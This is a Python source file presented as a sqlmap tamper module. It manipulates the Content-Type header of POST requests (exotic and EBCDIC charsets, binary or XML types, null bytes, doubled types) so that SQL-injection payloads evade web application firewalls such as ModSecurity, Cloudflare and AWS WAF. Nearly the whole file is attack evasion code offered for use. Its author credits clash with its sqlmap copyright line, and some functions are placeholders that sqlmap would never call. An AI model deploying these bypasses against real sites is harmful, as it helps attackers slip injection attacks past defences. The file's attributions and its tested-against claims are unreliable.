#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Manipulates Content-Type header to bypass WAF inspection rules

    Requirement:
        * POST method requests

    Tested against:
        * WAFs that only inspect specific Content-Types
        * ModSecurity with default rules
        * Cloudflare WAF
        * AWS WAF

    Notes:
        * Many WAFs only deeply inspect certain Content-Types like:
          - application/x-www-form-urlencoded
          - application/json
          - multipart/form-data
        * By using unusual Content-Types, the WAF may skip inspection
        * The backend may still process the request correctly
        * Some backends are lenient and parse data regardless of Content-Type

    Reference:
        * https://medium.com/@gasmask/bypassing-wafs-in-2025-new-techniques-and-evasion-tactics

    >>> tamper('1 AND 1=1')
    '1 AND 1=1'
    """

    headers = kwargs.get("headers", {})
    
    # List of Content-Types that may bypass WAF inspection
    # while still being processed by lenient backends
    bypass_content_types = [
        # Binary types - WAFs often skip these
        "application/octet-stream",
        "application/x-binary",
        
        # Text types - may bypass form-data specific rules
        "text/plain",
        "text/html",
        "text/csv",
        
        # Exotic charsets - may confuse WAF parsing
        "application/x-www-form-urlencoded; charset=ibm500",
        "application/x-www-form-urlencoded; charset=utf-7",
        "application/x-www-form-urlencoded; charset=ibm037",
        "application/x-www-form-urlencoded; charset=cp500",
        
        # XML/SOAP types - different parsing rules
        "application/xml",
        "text/xml",
        "application/soap+xml",
        
        # Rare but valid types
        "application/x-httpd-php",
        "application/x-php",
        
        # With boundary manipulation (for multipart bypass)
        "multipart/form-data; boundary=" + "A" * 70,
        
        # Double Content-Type (parser confusion)
        "application/x-www-form-urlencoded, text/plain",
    ]
    
    # Select a random bypass Content-Type
    selected_type = random.choice(bypass_content_types)
    headers["Content-Type"] = selected_type
    
    return payload


def tamper_charset_ebcdic(payload, **kwargs):
    """
    Uses EBCDIC charset in Content-Type to confuse WAF parsers
    that don't handle charset conversion properly
    """
    
    headers = kwargs.get("headers", {})
    
    # EBCDIC charsets that may confuse WAFs
    ebcdic_charsets = [
        "ibm500",   # EBCDIC International
        "ibm037",   # EBCDIC US-Canada  
        "cp500",    # Same as ibm500
        "cp037",    # Same as ibm037
        "ibm1047",  # EBCDIC Latin 1/Open Systems
    ]
    
    charset = random.choice(ebcdic_charsets)
    headers["Content-Type"] = "application/x-www-form-urlencoded; charset=%s" % charset
    
    return payload


def tamper_double_content_type(payload, **kwargs):
    """
    Sends multiple Content-Type headers to exploit parser differences
    between WAF and backend
    """
    
    headers = kwargs.get("headers", {})
    
    # Some systems take first, others take last
    # WAF might check one, backend uses the other
    headers["Content-Type"] = "text/plain"
    # Note: To send duplicate headers, this would need request-level support
    # This sets up the marker for custom handling
    headers["X-Double-Content-Type"] = "application/x-www-form-urlencoded"
    
    return payload


def tamper_null_byte_content_type(payload, **kwargs):
    """
    Injects null byte in Content-Type to truncate WAF parsing
    """
    
    headers = kwargs.get("headers", {})
    
    # Null byte may cause WAF to stop parsing Content-Type
    # while backend ignores it and processes correctly
    headers["Content-Type"] = "application/x-www-form-urlencoded\x00; charset=utf-8"
    
    return payload
